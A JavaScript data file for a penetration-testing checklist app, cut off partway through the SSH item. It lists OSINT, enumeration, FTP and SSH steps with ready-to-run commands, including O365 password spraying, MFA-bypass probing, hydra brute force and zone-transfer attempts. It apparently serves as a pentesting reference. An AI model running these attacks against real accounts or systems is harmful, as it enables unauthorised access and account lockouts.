/* ═══════════════════════════════════════════════════════════════════
   Security Tracker – Checklist Data
   ═══════════════════════════════════════════════════════════════════
   EDITING GUIDE
   ─────────────
   Each phase is an object in the `checklistPhases` array below.

   Phase structure:
     {
       id:       "unique_phase_id",         // snake_case, must be unique
       name:     "Display Name",
       optional: true|false,                // optional phases can be toggled off
       items:    [ ...checklist items... ]
     }

   Item structure:
     {
       id:          "phase-N",              // convention: "<phase>-<number>"
       name:        "Item Name",
       description: "What this item checks or does.",
       commands: [                          // array of command groups
         {
           desc:    "Group heading",         // shown above the code block
           entries: [                        // array of subdesc/cmd pairs
             {
               subdesc: "Optional subheading",  // smaller text below heading
               cmd: [                            // each string = one line of output
                 "command1",
                 "command2 --flag"
               ]
             }
           ]
         }
       ]
     }

   Notes:
   • `cmd` arrays are joined with newlines at load time (normalizeMultiline).
   • The phase with id "active_directory_exploitation" is only shown
     for Windows machines — no extra config needed.
   • To add a new phase, copy an existing phase object and change its
     id/name/items.  The app picks up changes automatically.
   ═══════════════════════════════════════════════════════════════════ */

/** Join array-of-lines into a single newline-delimited string. */
function normalizeMultiline(value) {
  if (Array.isArray(value)) return value.join('\n');
  return value;
}

/**
 * Walk every phase → item → command entry and collapse
 * any `cmd` arrays into single strings (for <pre> rendering).
 */
function normalizeChecklistPhases(phases) {
  phases.forEach((phase) => {
    (phase.items || []).forEach((item) => {
      item.command = normalizeMultiline(item.command);
      if (Array.isArray(item.commands)) {
        item.commands.forEach((entry) => {
          if (Array.isArray(entry.entries)) {
            entry.entries.forEach((e) => {
              e.cmd = normalizeMultiline(e.cmd);
            });
          }
        });
      }
    });
  });
}

const checklistPhases = [
  /* ─── Phase 1: OSINT ──────────────────────────────────── */
  {
    "id": "osint",
    "name": "OSINT",
    "optional": true,
    "items": [
      {
        "id": "osint-1",
        "name": "OSINT Overview & Nessus Setup",
        "description": "Open Source Intelligence (OSINT) is the foundation of any engagement. The goal is to gather as much information as possible about the target without directly interacting with their systems, thereby remaining undetected.",
        "commands": [
          {
            "desc": "Nessus Installation / Startup",
            "entries": [
              {
                "subdesc": "Download from: https://docs.tenable.com/nessus/Content/InstallNessusLinux.htm",
                "cmd": [
                  "dpkg -i <DEB-FILE>",
                  "systemctl start nessusd",
                  "",
                  "# Access the web interface at:",
                  "# https://localhost:8834"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-2",
        "name": "Attack Strategy",
        "description": "Strategy overview and engagement checklist for external penetration tests. Focus areas: low chance of RCE, high chance of weak passwords, and OSINT-driven logical guessing.",
        "commands": [
          {
            "desc": "Key Observations",
            "entries": [
              {
                "cmd": [
                  "# Low chance of RCE",
                  "# High chance of WEAK PASSWORDS",
                  "# OSINT is your best friend (and logical guessing)"
                ]
              }
            ]
          },
          {
            "desc": "Engagement Checklist",
            "entries": [
              {
                "cmd": [
                  "# [ ] Conduct vulnerability scanning with Nessus.",
                  "# [ ] Identify emails/users/passwords in breach databases.",
                  "# [ ] Identify employees and email address format.",
                  "# [ ] Identify client website(s) and search for any useful data.",
                  "# [ ] Attempt to enumerate any accounts on portals (password reset)",
                  "# [ ] Run any other necessary web app scans.",
                  "# [ ] Conduct manual testing and exploitation on targets.",
                  "# [ ] Validate scanning tool vulnerabilities.",
                  "# [ ] Conduct password spraying guessing and brute-force on logins.",
                  "# [ ] Escalate access from external to internal.",
                  "# [ ] Validate previous year findings have been resolved."
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-3",
        "name": "Vulnerability Scanning",
        "description": "Kick this off BEFORE any OSINT since it can take some time.",
        "commands": [
          {
            "desc": "Vulnerability Scanning",
            "entries": [
              {
                "subdesc": "Start a vulnerability scan early in the engagement. Use Nessus or similar tools.",
                "cmd": [
                  "# Kick off Nessus scan before starting OSINT",
                  "# Reference: https://www.melcara.com/archives/261"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-4",
        "name": "Passive Reconnaissance Methodology",
        "description": "Comprehensive passive reconnaissance methodology covering domain enumeration, subdomain discovery, Google dorking, email harvesting, breach database lookups, and technology fingerprinting.",
        "commands": [
          {
            "desc": "1. Domain & Infrastructure OSINT",
            "entries": [
              {
                "subdesc": "WHOIS lookup, DNS enumeration, reverse DNS, and zone transfer attempts.",
                "cmd": [
                  "# WHOIS lookup â€” reveals registrant info, name servers, and registration dates",
                  "whois example.com",
                  "",
                  "# DNS enumeration â€” identify subdomains, mail servers, and name servers",
                  "dig example.com ANY +noall +answer",
                  "dig example.com MX +short",
                  "dig example.com NS +short",
                  "dig example.com TXT +short",
                  "",
                  "# Reverse DNS lookup",
                  "dig -x <IP-ADDRESS> +short",
                  "",
                  "# DNS zone transfer attempt (often misconfigured)",
                  "dig axfr @ns1.example.com example.com"
                ]
              }
            ]
          },
          {
            "desc": "2. Subdomain Discovery (Passive)",
            "entries": [
              {
                "subdesc": "Using Amass, Subfinder, and Certificate Transparency logs.",
                "cmd": [
                  "# Using Amass in passive mode â€” aggregates data from dozens of OSINT sources",
                  "amass enum -passive -d example.com -o subdomains.txt",
                  "",
                  "# Using Subfinder â€” fast passive subdomain enumeration",
                  "subfinder -d example.com -o subfinder_results.txt",
                  "",
                  "# Using crt.sh (Certificate Transparency logs) via curl",
                  "curl -s \"https://crt.sh/?q=%25.example.com&output=json\" | jq -r '.[].name_value' | sort -u"
                ]
              }
            ]
          },
          {
            "desc": "3. Google Dorking",
            "entries": [
              {
                "subdesc": "Use Google search operators to find exposed pages, documents, configs, and more.",
                "cmd": [
                  "# Find exposed login pages",
                  "site:example.com inurl:login OR inurl:admin OR inurl:portal",
                  "",
                  "# Find exposed documents",
                  "site:example.com filetype:pdf OR filetype:docx OR filetype:xlsx",
                  "",
                  "# Find directory listings",
                  "site:example.com intitle:\"index of\" OR intitle:\"parent directory\"",
                  "",
                  "# Find configuration files",
                  "site:example.com filetype:env OR filetype:cfg OR filetype:conf OR filetype:ini",
                  "",
                  "# Find exposed databases or backups",
                  "site:example.com filetype:sql OR filetype:bak OR filetype:log",
                  "",
                  "# Find email addresses",
                  "site:example.com intext:\"@example.com\""
                ]
              }
            ]
          },
          {
            "desc": "4. Email & Employee OSINT",
            "entries": [
              {
                "subdesc": "Aggregates emails, subdomains, hosts, and names from public sources.",
                "cmd": [
                  "theHarvester -d example.com -b google,bing,linkedin,dnsdumpster -l 500 -f results.html"
                ]
              },
              {
                "subdesc": "Useful reference sites for people searches:",
                "cmd": [
                  "# WhitePages    â€” https://www.whitepages.com/",
                  "# WebMii        â€” https://webmii.com/",
                  "# PeekYou       â€” https://www.peekyou.com/",
                  "# 411           â€” https://www.411.com/",
                  "# Spokeo        â€” https://www.spokeo.com/",
                  "# That'sThem    â€” https://thatsthem.com/"
                ]
              },
              {
                "subdesc": "Hunting Breached Credentials â€” Check if a password is compromised.",
                "cmd": [
                  "# DeHashed: https://support.dehashed.com/hc/en-us"
                ]
              }
            ]
          },
          {
            "desc": "5. Phone Numbers",
            "entries": [
              {
                "subdesc": "Phone number OSINT resources.",
                "cmd": [
                  "# TrueCaller    â€” https://www.truecaller.com",
                  "# CallerID Test â€” RETIRED",
                  "# Infobel       â€” https://www.infobel.com/"
                ]
              }
            ]
          },
          {
            "desc": "6. Username & Password OSINT",
            "entries": [
              {
                "subdesc": "Password Leak Databases:",
                "cmd": [
                  "# WeLeakInfo     â€” weleakinfo.to        â€” Aggregated breach database search",
                  "# LeakCheck      â€” leakcheck.io          â€” Check if credentials appear in breaches",
                  "# SnusBase       â€” snusbase.com          â€” Searchable breach database",
                  "# HaveIBeenPwned â€” haveibeenpwned.com    â€” Check if an email has been compromised",
                  "# DeHashed       â€” dehashed.com          â€” Breach data search engine"
                ]
              },
              {
                "subdesc": "Username Enumeration:",
                "cmd": [
                  "# NameChk     â€” namechk.com              â€” Check username availability across platforms",
                  "# WhatsMyName â€” whatsmyname.app           â€” Username enumeration across 500+ sites",
                  "# Sherlock    â€” github.com/sherlock-project â€” CLI tool for username hunting across social networks"
                ]
              }
            ]
          },
          {
            "desc": "7. Website OSINT",
            "entries": [
              {
                "subdesc": "Reference for website OSINT techniques.",
                "cmd": [
                  "# Reference: https://pnpt.adot8.com/"
                ]
              }
            ]
          },
          {
            "desc": "8. Technology Fingerprinting",
            "entries": [
              {
                "subdesc": "Identify CMS, frameworks, CDNs, analytics, and technology stacks.",
                "cmd": [
                  "# Wappalyzer (browser extension) â€” identifies CMS, frameworks, CDNs, analytics",
                  "",
                  "# WhatWeb â€” CLI-based technology fingerprinting",
                  "whatweb example.com",
                  "",
                  "# Builtwith â€” identifies the technology stack",
                  "# Use builtwith.com for web-based lookups"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-5",
        "name": "Key OSINT Resources",
        "description": "Essential OSINT tools and platforms for internet-wide scanning, visual link analysis, and automated reconnaissance.",
        "commands": [
          {
            "desc": "Key OSINT Tools",
            "entries": [
              {
                "cmd": [
                  "# Shodan       â€” Search engine for internet-connected devices",
                  "# Censys       â€” Internet-wide scanning data",
                  "# FOFA         â€” Chinese Shodan equivalent",
                  "# Maltego      â€” Visual link analysis and OSINT automation",
                  "# SpiderFoot   â€” Automated OSINT collection and correlation",
                  "# Recon-ng     â€” Full-featured reconnaissance framework"
                ]
              }
            ]
          },
          {
            "desc": "autoOSINT.sh",
            "entries": [
              {
                "subdesc": "Automated OSINT bash script â€” combines whois, subdomain enumeration, alive probing, takeover checks, port scanning, and Wayback Machine scraping.",
                "cmd": [
                  "#!/bin/bash",
                  "RED=\"\\033[1;31m\"",
                  "GREEN=\"\\033[1;32m\"",
                  "RESET=\"\\033[0m\"",
                  "",
                  "if [ -z \"$1\" ]; then",
                  "    echo -e \"${RED}Usage: $0 <domain>${RESET}\"",
                  "    exit 1",
                  "fi",
                  "",
                  "domain=\"$1\"",
                  "dir=\"$domain\"",
                  "mkdir -p \"$dir\"",
                  "",
                  "# â”€â”€ Whois â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€",
                  "echo -e \"${GREEN}[+] Running whois...${RESET}\"",
                  "whois \"$domain\" > \"$dir/whois.txt\"",
                  "",
                  "# â”€â”€ Subdomain Enumeration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€",
                  "echo -e \"${GREEN}[+] Harvesting subdomains with assetfinder...${RESET}\"",
                  "assetfinder \"$domain\" | grep \"$domain\" > \"$dir/subs_raw.txt\"",
                  "",
                  "if command -v subfinder &>/dev/null; then",
                  "    echo -e \"${GREEN}[+] Harvesting subdomains with subfinder...${RESET}\"",
                  "    subfinder -d \"$domain\" >> \"$dir/subs_raw.txt\"",
                  "fi",
                  "",
                  "if command -v amass &>/dev/null; then",
                  "    echo -e \"${GREEN}[+] Harvesting subdomains with amass...${RESET}\"",
                  "    amass enum -d \"$domain\" >> \"$dir/subs_raw.txt\"",
                  "fi",
                  "",
                  "sort -u \"$dir/subs_raw.txt\" > \"$dir/subdomains.txt\"",
                  "rm -f \"$dir/subs_raw.txt\"",
                  "",
                  "# â”€â”€ Probe Alive Domains â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€",
                  "echo -e \"${GREEN}[+] Probing for alive domains...${RESET}\"",
                  "cat \"$dir/subdomains.txt\" | httprobe -prefer-https | sed 's/https\\?:\\/\\///' | sort -u > \"$dir/alive.txt\"",
                  "",
                  "# â”€â”€ Subdomain Takeover Check â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€",
                  "echo -e \"${GREEN}[+] Checking for possible subdomain takeover...${RESET}\"",
                  "fingerprints=\"\"",
                  "gopath=$(go env GOPATH 2>/dev/null)",
                  "if [ -n \"$gopath\" ] && [ -f \"$gopath/src/github.com/haccer/subjack/fingerprints.json\" ]; then",
                  "    fingerprints=\"$gopath/src/github.com/haccer/subjack/fingerprints.json\"",
                  "elif [ -f \"/usr/share/subjack/fingerprints.json\" ]; then",
                  "    fingerprints=\"/usr/share/subjack/fingerprints.json\"",
                  "elif command -v subjack &>/dev/null; then",
                  "    subjack_bin=$(command -v subjack)",
                  "    if [ -f \"$(dirname \"$subjack_bin\")/fingerprints.json\" ]; then",
                  "        fingerprints=\"$(dirname \"$subjack_bin\")/fingerprints.json\"",
                  "    fi",
                  "fi",
                  "",
                  "if [ -n \"$fingerprints\" ]; then",
                  "    subjack -w \"$dir/subdomains.txt\" -t 100 -timeout 30 -ssl -c \"$fingerprints\" -v 3 -o \"$dir/takeovers.txt\"",
                  "else",
                  "    echo -e \"${RED}[-] subjack fingerprints.json not found â€” skipping takeover check.${RESET}\"",
                  "fi",
                  "",
                  "# â”€â”€ Port Scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€",
                  "echo -e \"${GREEN}[+] Scanning for open ports...${RESET}\"",
                  "nmap -iL \"$dir/alive.txt\" -T4 -oA -Pn \"$dir/nmap_scan\"",
                  "",
                  "# â”€â”€ Wayback Machine â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€",
                  "echo -e \"${GREEN}[+] Scraping wayback data...${RESET}\"",
                  "cat \"$dir/subdomains.txt\" | waybackurls | sort -u | tee \"$dir/wayback_urls.txt\"",
                  "",
                  "echo -e \"${GREEN}[+] Extracting params from wayback data...${RESET}\"",
                  "grep '?.*=' \"$dir/wayback_urls.txt\" | cut -d '=' -f 1 | sort -u > \"$dir/wayback_params.txt\"",
                  "",
                  "echo -e \"${GREEN}[+] Sorting wayback URLs by extension...${RESET}\"",
                  "for ext in js jsp json php aspx; do",
                  "    grep -i \"\\.${ext}\\$\" \"$dir/wayback_urls.txt\" | sort -u > \"$dir/wayback_${ext}.txt\"",
                  "    # Remove empty files",
                  "    [ -s \"$dir/wayback_${ext}.txt\" ] || rm -f \"$dir/wayback_${ext}.txt\"",
                  "done",
                  "",
                  "# â”€â”€ Summary â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€",
                  "echo \"\"",
                  "echo -e \"${GREEN}[âœ“] Done. All results saved in ./$dir/${RESET}\"",
                  "echo \"    subdomains.txt    â€” unique subdomains\"",
                  "echo \"    alive.txt         â€” live hosts\"",
                  "echo \"    whois.txt         â€” whois info\"",
                  "echo \"    nmap_scan.*       â€” port scan results\"",
                  "echo \"    takeovers.txt     â€” potential subdomain takeovers\"",
                  "echo \"    wayback_urls.txt  â€” wayback URLs\"",
                  "echo \"    wayback_params.txtâ€” extracted parameters\"",
                  "echo \"    wayback_*.txt     â€” URLs by file extension\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-6",
        "name": "Attacking Login Portals â€” O365",
        "description": "Attack techniques for Office365 login portals using TREVORspray for password spraying through SSH proxies.",
        "commands": [
          {
            "desc": "O365 â€” TREVORspray",
            "entries": [
              {
                "subdesc": "Installation â€” https://github.com/blacklanternsecurity/TREVORspray",
                "cmd": [
                  "pip install git+https://github.com/blacklanternsecurity/trevorproxy",
                  "pip install git+https://github.com/blacklanternsecurity/trevorspray"
                ]
              },
              {
                "subdesc": "Example run",
                "cmd": [
                  "python3 trevorspray.py -e <PATH-to-List-of-EMAILS> --passwords 'Winter20!' --delay 15 --no-current-ip --ssh user@<IP1> user@<IP2> user@<IPX> -k certificate.pem"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-7",
        "name": "Attacking Login Portals â€” OWA",
        "description": "Attack techniques for Outlook Web Access (OWA) login portals using Metasploit's OWA login scanner module.",
        "commands": [
          {
            "desc": "OWA â€” Metasploit",
            "entries": [
              {
                "subdesc": "Load up Metasploit for the specific OWA login.",
                "cmd": [
                  "use auxiliary/scanner/http/owa_login",
                  "",
                  "# Set PASSWORD, RHOST and, if needed, USER_FILE for a list of users."
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-8",
        "name": "Attacking Login Portals â€” Other Portals",
        "description": "Generic login portal attack methodology using Burp Suite. Capture POST requests, identify error messages, and use Intruder's Sniper attack for credential stuffing.",
        "commands": [
          {
            "desc": "Burp Suite Login Attack",
            "entries": [
              {
                "subdesc": "Capture and analyze login attempts with Burp Suite. Stay in scope if possible.",
                "cmd": [
                  "# 1. Grab a POST request from the login attempt",
                  "# 2. Look for error messages in the response",
                  "# 3. Using Burp, grep-match a word/phrase from the error",
                  "# 4. With a valid username, use a SNIPER attack on the password field",
                  "# 5. Identify valid credentials based on multiple response parameters"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-9",
        "name": "Attacking Login Portals â€” Bypassing MFA",
        "description": "Techniques for identifying and bypassing Multi-Factor Authentication (MFA) on Microsoft services using MFASweep and individual module testing.",
        "commands": [
          {
            "desc": "MFASweep",
            "entries": [
              {
                "subdesc": "MFASweep is a PowerShell script that attempts to log in to various Microsoft services using a provided set of credentials and will attempt to identify if MFA is enabled. WARNING: This script attempts to login to the provided account TEN (10) different times (11 if you include ADFS). If you entered an incorrect password this may lock the account out.",
                "cmd": [
                  "# Basic Usage",
                  "Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2024 -WriteTokens",
                  "",
                  "# With ADFS recon",
                  "Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS"
                ]
              }
            ]
          },
          {
            "desc": "Individual Modules",
            "entries": [
              {
                "subdesc": "Microsoft Graph API",
                "cmd": [
                  "Invoke-GraphAPIAuth -Username targetuser@targetdomain.com -Password Winter2020"
                ]
              },
              {
                "subdesc": "Azure Service Management API",
                "cmd": [
                  "Invoke-AzureManagementAPIAuth -Username targetuser@targetdomain.com -Password Winter2020"
                ]
              },
              {
                "subdesc": "Microsoft 365 Exchange Web Services",
                "cmd": [
                  "Invoke-EWSAuth -Username targetuser@targetdomain.com -Password Winter2020"
                ]
              },
              {
                "subdesc": "Microsoft 365 Web Portal",
                "cmd": [
                  "Invoke-O365WebPortalAuth -Username targetuser@targetdomain.com -Password Winter2020"
                ]
              },
              {
                "subdesc": "Microsoft 365 Web Portal w/ Mobile User Agent",
                "cmd": [
                  "Invoke-O365WebPortalAuthMobile -Username targetuser@targetdomain.com -Password Winter2020"
                ]
              },
              {
                "subdesc": "Microsoft 365 Active Sync",
                "cmd": [
                  "Invoke-O365ActiveSyncAuth -Username targetuser@targetdomain.com -Password Winter2020"
                ]
              },
              {
                "subdesc": "ADFS",
                "cmd": [
                  "Invoke-ADFSAuth -Username targetuser@targetdomain.com -Password Winter2020"
                ]
              }
            ]
          }
        ]
      }
    ]
  },
  /* ─── Phase 2: Enumeration / Recon ────────────────────── */
  {
    "id": "recon",
    "name": "Enumeration",
    "optional": false,
    "items": [
        {
          "id": "recon-1",
          "name": "Host Discovery",
          "description": "Start here. Identify which hosts are alive before wasting time scanning dead IPs.",
          "commands": [
            {
              "desc": "Host Discovery",
              "entries": [
                {
                  "subdesc": "Start here. Identify which hosts are alive before wasting time scanning dead IPs.",
                  "cmd": [
                    "# Ping sweep with Nmap — discover live hosts on a subnet",
                    "nmap -sn 192.168.1.0/24 -oG ping_sweep.txt",
                    "grep \"Up\" ping_sweep.txt | cut -d \" \" -f 2 > live_hosts.txt",
                    "",
                    "# Using fping for faster sweeps",
                    "fping -a -g 192.168.1.0/24 2>/dev/null"
                  ]
                }
              ]
            },
            {
              "desc": "Automated Scanning (Recommended First Pass)",
              "entries": [
                {
                  "subdesc": "AutoRecon is the gold standard for automated enumeration. It runs Nmap, Nikto, Gobuster, and service-specific scripts automatically in parallel. Always run this first while you manually explore.",
                  "cmd": [
                    "# AutoRecon — automated reconnaissance tool that runs multiple scans in parallel",
                    "autorecon <TARGET-IP> -o ./recon_output",
                    "",
                    "# RustScan — ultra-fast port scanner, pipes results to Nmap",
                    "rustscan -a <TARGET-IP> --ulimit 5000 -- -A -sC -sV -oN rustscan_output.txt"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-2",
          "name": "Full TCP Scan",
          "description": "Run a full port scan on every target. The default top-1000 ports misses services on non-standard ports. Always use -p-.",
          "commands": [
            {
              "desc": "Full TCP Scan",
              "entries": [
                {
                  "subdesc": "Run a full port scan on every target. The default top-1000 ports misses services on non-standard ports. Always use -p-.",
                  "cmd": [
                    "# Scan all 65,535 TCP ports with version detection and default scripts",
                    "nmap -sC -sV -p- <TARGET-IP> -oN full_tcp.txt",
                    "",
                    "# Aggressive scan (OS detection, version detection, script scanning, traceroute)",
                    "nmap -A -p- <TARGET-IP> -oN aggressive_scan.txt"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-3",
          "name": "UDP Scan (Top Ports)",
          "description": "Don't skip UDP. SNMP (161), TFTP (69), and DNS (53) are common attack vectors. UDP scans are slow, so target the top 100 ports.",
          "commands": [
            {
              "desc": "UDP Scan (Top Ports)",
              "entries": [
                {
                  "subdesc": "Don't skip UDP. SNMP (161), TFTP (69), and DNS (53) are common attack vectors. UDP scans are slow, so target the top 100 ports.",
                  "cmd": [
                    "# UDP scans are slow — scan top 100 UDP ports",
                    "sudo nmap -sU --top-ports 100 <TARGET-IP> -oN udp_scan.txt",
                    "",
                    "# Targeted UDP scan for common services",
                    "sudo nmap -sU -p 53,67,68,69,123,161,162,500,514,1900 <TARGET-IP> -oN udp_targeted.txt"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-4",
          "name": "Manual Scanning (When Tools Are Unavailable)",
          "description": "Manual Scanning (When Tools Are Unavailable)",
          "commands": [
            {
              "desc": "Linux — Bash Ping Sweep",
              "entries": [
                {
                  "subdesc": "Use when nmap is not available on the compromised host. These one-liners use only built-in bash/PowerShell.",
                  "cmd": [
                    "for i in $(seq 1 254); do",
                    "    (ping -c 1 -W 1 192.168.1.$i | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" &)",
                    "done; wait"
                  ]
                }
              ]
            },
            {
              "desc": "Linux — Bash Port Scan",
              "entries": [
                {
                  "cmd": [
                    "for port in $(seq 1 65535); do",
                    "    (echo >/dev/tcp/<TARGET-IP>/$port) 2>/dev/null && echo \"[+] Port $port is open\"",
                    "done"
                  ]
                }
              ]
            },
            {
              "desc": "Windows — PowerShell Subnet Scan",
              "entries": [
                {
                  "cmd": [
                    "1..254 | ForEach-Object {",
                    "    $ip = \"192.168.1.$_\"",
                    "    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {",
                    "        Write-Host \"[+] $ip is alive\" -ForegroundColor Green",
                    "    }",
                    "}"
                  ]
                }
              ]
            },
            {
              "desc": "Windows — PowerShell Port Scan",
              "entries": [
                {
                  "cmd": [
                    "$target = \"192.168.1.100\"",
                    "$ports = 1..1024",
                    "foreach ($port in $ports) {",
                    "    $tcp = New-Object System.Net.Sockets.TcpClient",
                    "    try {",
                    "        $tcp.Connect($target, $port)",
                    "        Write-Host \"[+] Port $port is open\" -ForegroundColor Green",
                    "        $tcp.Close()",
                    "    } catch {}",
                    "}"
                  ]
                }
              ]
            },
            {
              "desc": "Banner Grabbing",
              "entries": [
                {
                  "subdesc": "Grab service banners to identify software and versions. This can reveal outdated software with known CVEs.",
                  "cmd": [
                    "# Netcat banner grab",
                    "nc -nv <TARGET-IP> <PORT>",
                    "",
                    "# Nmap banner grab",
                    "nmap -sV --script=banner -p <PORT> <TARGET-IP>",
                    "",
                    "# Using curl for HTTP banners",
                    "curl -I http://<TARGET-IP>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-5",
          "name": "Squid Proxy Enumeration",
          "description": "Squid is a caching/forwarding HTTP proxy. When encountered, it may expose internal services that are otherwise inaccessible.",
          "commands": [
            {
              "desc": "Port Scanning Behind Squid",
              "entries": [
                {
                  "subdesc": "Use spose.py to scan for exposed ports behind a Squid proxy:",
                  "cmd": [
                    "python3 spose.py --proxy http://<IPADDR>:3128 --target <IPADDR>"
                  ]
                }
              ]
            },
            {
              "desc": "Open Proxy Check",
              "entries": [
                {
                  "subdesc": "Verify if the Squid proxy allows open (unauthenticated) proxying:",
                  "cmd": [
                    "curl -x http://<IPADDR>:3128 http://example.com"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-6",
          "name": "Masscan (Fast Port Scanning)",
          "description": "Purpose: Masscan is significantly faster than Nmap for initial port discovery across large ranges. Use it to find open ports quickly, then follow up with Nmap for service/version detection on discovered ports.",
          "commands": [
            {
              "desc": "Masscan (Fast Port Scanning)",
              "entries": [
                {
                  "subdesc": "Purpose: Masscan is significantly faster than Nmap for initial port discovery across large ranges. Use it to find open ports quickly, then follow up with Nmap for service/version detection on discovered ports.",
                  "cmd": [
                    "# Scan all TCP ports on a single target (very fast)",
                    "sudo masscan -p1-65535 <TARGET-IP> --rate=1000 -oL masscan_output.txt",
                    "",
                    "# Scan a subnet",
                    "sudo masscan -p1-65535 <SUBNET>/24 --rate=500 -oL masscan_output.txt",
                    "",
                    "# Scan common ports faster",
                    "sudo masscan -p 21,22,23,25,53,80,88,110,135,139,143,161,389,443,445,1433,2049,3306,3389,5432,5985,6379,8080,8443 <SUBNET>/24 --rate=1000",
                    "",
                    "# Then follow up with Nmap version detection on discovered ports",
                    "nmap -sC -sV -p <DISCOVERED-PORTS> <TARGET-IP>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-7",
          "name": "FTP Enumeration (21)",
          "description": "FTP (File Transfer Protocol) runs on TCP port 21 and is one of the oldest network protocols still in wide use. From a pentesting perspective, FTP is a goldmine — it frequently allows anonymous access, transmits credentials in cleartext, and older versions are riddled with known exploits (e.g., vsftpd 2.3.4 backdoor, ProFTPD mod_copy). Tip: Always check for anonymous FTP access first. It’s a quick win that can yield sensitive files, credentials, or writable upload directories for webshell placement.",
          "commands": [
            {
              "desc": "Anonymous Access Check",
              "entries": [
                {
                  "cmd": [
                    "ftp anonymous@<TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Batch Download All Files",
              "entries": [
                {
                  "subdesc": "Once connected, download everything recursively:",
                  "cmd": [
                    "binary",
                    "PROMPT OFF",
                    "mget *"
                  ]
                }
              ]
            },
            {
              "desc": "Common FTP Commands",
              "entries": [
                {
                  "cmd": [
                    "ls          # List directory contents",
                    "pwd         # Print working directory",
                    "cd <dir>    # Change directory",
                    "get <file>  # Download a single file",
                    "put <file>  # Upload a file (if write access exists)",
                    "less <file> # View file contents",
                    "more <file> # View file contents (paginated)"
                  ]
                }
              ]
            },
            {
              "desc": "Nmap Service & Script Enumeration",
              "entries": [
                {
                  "cmd": [
                    "nmap -sV -sC -p 21 <TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Check for known FTP vulnerabilities:",
                  "cmd": [
                    "nmap --script ftp-vuln*,ftp-anon,ftp-syst -p 21 <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force FTP Credentials",
              "entries": [
                {
                  "cmd": [
                    "hydra -v -L users.txt -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<TARGET-IP> -t 4"
                  ]
                },
                {
                  "subdesc": "If FTP runs on a non-standard port, append -s <port>:",
                  "cmd": [
                    "hydra -v -L users.txt -P passwords.txt ftp://<TARGET-IP> -s 2121 -t 4"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] Anonymous login enabled?",
                    "# [ ] Writable directories? (try `put test.txt`)",
                    "# [ ] Sensitive files? (config files, backups, `.htpasswd`, SSH keys)",
                    "# [ ] FTP version vulnerable? (check with `searchsploit`)",
                    "# [ ] Banner reveals OS/version info?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-8",
          "name": "SSH Enumeration (22)",
          "description": "SSH (Secure Shell) runs on TCP port 22 and provides encrypted remote access. While SSH is inherently more secure than protocols like Telnet or FTP, misconfigurations, weak credentials, and outdated versions can still provide an attack surface. Key areas include version detection, algorithm enumeration (for downgrade attacks), and credential brute-forcing. Tip: SSH keys found elsewhere (web dirs, FTP, SMB shares, backups) are often the path in. Always check for id_rsa, .ssh/authorized_keys, and SSH config files during enumeration.",
          "commands": [
            {
              "desc": "SSH Version & Algorithm Audit",
              "entries": [
                {
                  "subdesc": "Identify the SSH version, supported algorithms, and potential weaknesses:",
                  "cmd": [
                    "ssh-audit <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Banner Grabbing",
              "entries": [
                {
                  "subdesc": "Force connection with legacy algorithms to grab the banner:",
                  "cmd": [
                    "ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 <TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Alternative banner grab via Nmap:",
                  "cmd": [
                    "nmap -sV -p 22 --script ssh2-enum-algos,ssh-hostkey <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force SSH Credentials",
              "entries": [
                {
                  "cmd": [
